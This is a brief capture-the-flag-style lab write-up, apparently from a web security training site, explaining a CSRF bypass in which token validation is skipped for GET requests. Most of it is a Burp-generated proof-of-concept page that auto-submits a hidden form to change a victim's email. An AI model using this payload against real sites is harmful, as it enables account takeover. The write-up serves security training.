# Lab: CSRF where token validation depends on request method

This is the same as the first lab, except the request contains a CSRF token. However, the application doesn't properly validate the token when `method="GET"`
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://aca81faa1e78305ec04fe6b000c10061.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
      <input type="hidden" name="csrf" value="<value>" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```